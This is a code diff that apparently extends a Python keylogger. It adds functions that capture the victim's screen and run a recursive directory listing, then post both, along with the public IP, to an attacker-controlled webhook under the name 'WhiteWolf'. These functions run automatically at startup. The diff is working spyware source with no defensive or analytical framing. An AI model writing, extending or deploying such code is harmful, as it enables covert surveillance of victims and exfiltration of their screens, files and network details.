@@ -2,8 +2,10 @@ import os
 import time
 import requests
 import threading
+import subprocess
+import io
+import mss.tools
 from pynput import keyboard
-
 
 red = "\033[31m"
 green = "\033[32m"
@@ -33,6 +35,36 @@ os.system("cls")
 
 webhook = webhook_choix
 
+
+def capture():
+    with mss.MSS() as sct:
+        img = sct.grab(sct.monitors[1])
+
+        img_bytes = mss.tools.to_png(img.rgb, img.size)
+
+    files = {
+        "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
+    }
+
+    requests.post(webhook, data={"content": "screenshot", "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"}, files=files)
+
+
+def dir():
+    try:
+        result = subprocess.run("dir /s", shell=True, capture_output=True, text=True)
+        contenue = result.stdout[:1900]
+        
+        data = {
+            "content": contenue,
+            "username": "WhiteWolf",
+            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
+        }
+        requests.post(webhook, json=data)
+    except Exception as e:
+        print("Probleme et survenue", e)
+        requests.post(webhook, json={"content": str(e)})
+
+
 def ip():
     try:
         ip = requests.get("https://checkip.amazonaws.com").text.strip()
@@ -47,6 +79,8 @@ def ip():
         time.sleep(3)
 
 ip()
+dir()
+capture()
 
 buffer = ""
 timer = None
